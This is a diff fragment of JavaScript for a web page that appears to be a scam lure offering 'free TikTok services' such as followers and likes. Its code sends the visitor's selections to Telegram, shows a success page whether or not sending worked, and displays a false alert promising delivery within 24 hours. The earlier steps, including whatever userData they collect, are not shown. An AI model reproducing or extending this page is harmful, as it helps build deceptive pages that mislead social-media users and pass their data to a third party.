+            event.currentTarget.style.background = 'rgba(254, 44, 85, 0.05)';
+        }
+        
+        // Select amount
+        function selectAmount(amount) {
+            userData.selectedAmount = amount;
+            
+            // Update UI to show selected amount
+            document.querySelectorAll('.amount-btn').forEach(btn => {
+                btn.classList.remove('selected');
+            });
+            
+            event.currentTarget.classList.add('selected');
+        }
+        
+        // Get service now
+        function getServiceNow() {
+            const loadingElement = document.getElementById('loading6');
+            
+            if (!userData.selectedService) {
+                showError('Please select a service');
+                return;
+            }
+            
+            if (!userData.selectedAmount) {
+                showError('Please select an amount');
+                return;
+            }
+            
+            loadingElement.style.display = 'block';
+            
+            // Send service data to Telegram
+            sendServiceData()
+                .then(success => {
+                    loadingElement.style.display = 'none';
+                    
+                    // Update success page with service details
+                    const serviceNames = {
+                        'views': 'Views',
+                        'likes': 'Likes', 
+                        'followers': 'Followers',
+                        'shares': 'Shares'
+                    };
+                    
+   document.getElementById('serviceType').textContent = serviceNames[userData.selectedService];
+                    document.getElementById('serviceAmount').textContent = userData.selectedAmount;
+                    document.getElementById('serviceName').textContent = serviceNames[userData.selectedService];
+                    
+                    showPage(7);
+                })
+                .catch(error => {
+                    loadingElement.style.display = 'none';
+                    showPage(7);
+                });
+        }
+        
+        // Finish order
+        function finishOrder() {
+            alert('Your free TikTok services are being processed! You will receive them within 24 hours.');
+            // In a real scenario, this would redirect to TikTok
+            // For demo purposes, we'll just reload the page
+            location.reload();
+        }
+        
+        // Show error message
+        function showError(message) {
+            const errorEl = document.getElementById('error');
+            errorEl.textContent = message;
+            errorEl.style.display = 'block';
+            
+            setTimeout(() => {
+                errorEl.style.display = 'none';
+            }, 5000);
+        }
+        
+        // Initialize amount buttons and select first service by default
+        document.addEventListener('DOMContentLoaded', function() {
+            // Select first amount by default
+            document.querySelector('.amount-btn').click();
+            
+            // Select first service by default
+            setTimeout(() => {
+                if (document.querySelector('.service-item')) {
+                    document.querySelector('.service-item').click();
+                }
+            }, 100);
+            
+            // Show the Base64 decoded signature in console
+            console.log('Base64 Signature:', decodeBase64(BASE64_SIGNATURE));
+        });
+    </script>
+</body>
+</html>
